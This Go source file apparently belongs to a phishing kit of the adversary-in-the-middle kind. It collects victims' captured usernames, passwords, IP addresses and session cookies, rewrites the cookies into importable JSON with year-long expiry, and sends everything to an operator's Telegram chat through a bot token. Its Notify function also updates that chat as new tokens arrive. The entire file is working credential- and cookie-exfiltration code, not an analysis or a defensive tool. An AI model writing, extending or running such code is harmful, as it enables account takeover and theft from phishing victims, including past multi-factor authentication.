package core

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				// Remove &
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			if len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}

			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)
		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	// Deduplicate tokens
	tokenMap := make(map[string]Token)
	for _, t := range consolidatedTokens {
		key := fmt.Sprintf("%s:%s:%s", t.Domain, t.Name, t.Path)
		tokenMap[key] = t
	}

	var allUniqueTokens []Token
	for _, t := range tokenMap {
		allUniqueTokens = append(allUniqueTokens, t)
	}

	return allUniqueTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var lastSentBody = make(map[string]string)
var lastSentTokenCount = make(map[string]int)
var editCount = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func extractTokensFromInterface(input map[string]interface{}) []Token {
	var tokens []Token

	for domain, domainVal := range input {
		domainMap, ok := domainVal.(map[string]interface{})
		if !ok {
			continue
		}
		for _, tokenVal := range domainMap {
			tokenData, ok := tokenVal.(map[string]interface{})
			if !ok {
				continue
			}

			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}

			// Remove leading dot from domain
			cleanDomain := domain
			if len(cleanDomain) > 0 && cleanDomain[0] == '.' {
				cleanDomain = cleanDomain[1:]
			}
			t.Domain = cleanDomain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}
			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func createTxtFile(session TSession) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Directly extract tokens from the session's interface{} maps
	var rawTokens []Token

	if len(session.Tokens) > 0 {
		rawTokens = append(rawTokens, extractTokensFromInterface(session.Tokens)...)
	}
	if len(session.HTTPTokens) > 0 {
		rawTokens = append(rawTokens, extractTokensFromInterface(session.HTTPTokens)...)
	}
	if len(session.BodyTokens) > 0 {
		rawTokens = append(rawTokens, extractTokensFromInterface(session.BodyTokens)...)
	}

	// Deduplicate tokens using Domain, Name, and Path as identity
	tokenMap := make(map[string]Token)
	for _, t := range rawTokens {
		key := fmt.Sprintf("%s:%s:%s", t.Domain, t.Name, t.Path)
		tokenMap[key] = t
	}

	var allTokens []Token
	for _, t := range tokenMap {
		allTokens = append(allTokens, t)
	}

	fmt.Printf("Combined Tokens count: %d (unique), %d (raw)\n", len(allTokens), len(rawTokens))

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling final tokens:", err)
		return "", fmt.Errorf("failed to marshal tokens: %v", err)
	}

	fmt.Println("Combined Tokens: ", string(result))

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session TSession) string {
	// Format the session information (no token data in message)
	createTimeStr := time.Unix(session.CreateTime, 0).Format("02/01/06 - 15:04")
	updateTimeStr := time.Unix(session.UpdateTime, 0).Format("02/01/06 - 15:04")

	return fmt.Sprintf("✨ Session Information ✨\n\n"+

		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %s\n"+
		"🕔 Update Time:   ➖ %s\n"+
		"\n"+
		"📦 Tokens are added in txt file.\n",

		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		createTimeStr,
		updateTimeStr,
	)
}
func Notify(session TSession, chatid string, teletoken string) {
	// Don't notify if the session is empty (no username, password, or tokens)
	tokenCount := len(session.Tokens) + len(session.HTTPTokens) + len(session.BodyTokens)
	if session.Username == "" && session.Password == "" && tokenCount == 0 {
		return
	}

	mu.Lock()
	sessionKey := fmt.Sprintf("%d", session.ID)
	// Check if the session is already processed
	if processedSessions[sessionKey] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[sessionKey]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			msg_body := formatSessionMessage(session)

			// Skip if content hasn't changed (avoid redundant updates)
			if lastSentBody[sessionKey] == msg_body && lastSentTokenCount[sessionKey] == tokenCount {
				return
			}

			editCount[sessionKey]++
			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body, editCount[sessionKey])
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			} else {
				lastSentBody[sessionKey] = msg_body
				lastSentTokenCount[sessionKey] = tokenCount
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", session.ID)
		}
		return
	}

	// Mark session as processed
	processedSessions[sessionKey] = true
	editCount[sessionKey] = 1
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	mu.Lock()
	sessionKey = fmt.Sprintf("%d", session.ID)
	sessionMessageMap[sessionKey] = messageID
	lastSentBody[sessionKey] = message
	lastSentTokenCount[sessionKey] = tokenCount
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)
}
